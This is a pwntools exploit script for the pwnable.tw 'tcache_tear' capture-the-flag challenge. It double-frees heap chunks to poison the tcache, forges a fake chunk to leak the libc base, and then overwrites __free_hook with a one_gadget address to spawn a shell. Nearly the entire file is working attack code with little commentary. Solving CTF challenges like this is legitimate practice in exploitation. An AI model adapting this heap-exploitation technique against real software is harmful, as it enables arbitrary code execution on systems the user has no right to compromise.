from pwn import * 

p = process("./tcache_tear") 
# p = remote("chall.pwnable.tw", 10207)
e = ELF("./tcache_tear")
libc = ELF("./libc.so") 
# libc = e.libc
name_ptr = 0x602060 

def malloc(size, data) : 
    print("malloc size : {}, data : {}".format(size, data))
    p.sendafter("Your choice :", '1')
    p.sendafter("Size:", str(size)) 
    p.sendafter("Data:", data) 

def free() : 
    p.sendafter("Your choice :", "2") 

def info() : 
    p.sendafter("Your choice :", "3") 
    return p.recvline() 

p.recv() 
p.sendline(p64(name_ptr+0x10))  

malloc(0x80, p64(name_ptr-0x10)) 
free() 
free()
malloc(0x80, '\x00\x30')     # tcache possion overwrite to tcach_per_thread 


# fix tcachebins number 
"""
tcachebins
0x90 [  7]: 0x0
0xf0 [  7]: 0x0
"""

malloc(0x80, 'a') 
malloc(0x80, p64(0)+ p64(0x251) + p64((0x7 << 56))+ p64(0x7 << 40) )  
malloc(0xf0, 'a') 
gdb.attach(p, 'b * 0x400c07')
free()  
free() 
malloc(0xf0, p64(name_ptr))

malloc(0xf0, 'a') 
malloc(0xf0, p64(0x91) + p64(0x91))


# leak libc via unsorted bins 

fakechunk = ""
fakechunk += "a" * 0x18 + p64(name_ptr + 0x10) + "a" * 0x60 + p64(0x0) + p64(0x51)     # chunk B 
fakechunk += "b" * 0x40 + p64(0x0) + p64(0x1)
malloc(0xf0, fakechunk )  

# gdb.attach(p, 'b * 0x400c07') 
free()   
name = info() 
libc.address = u64(name[22:30]) - 0x3ebca0
free_hook = libc.sym['__free_hook'] 
gadget = [0x4f2c5, 0x4f322, 0x10a38c] 
one_gadget = libc.address + gadget[1] 

log.success("LIBC = " + hex(libc.address)) 

malloc(0xb0, 'a') 

free()
free() 

malloc(0xb0, p64(free_hook)) 
# gdb.attach(p, 'b * 0x400c07')
malloc(0xb0, 'a')  
malloc(0xb0, p64(one_gadget)) 
# malloc(0xb0, 'a')
# p.sendafter("Your choice :", "/bin/sh\x00")
free()

# 
p.interactive()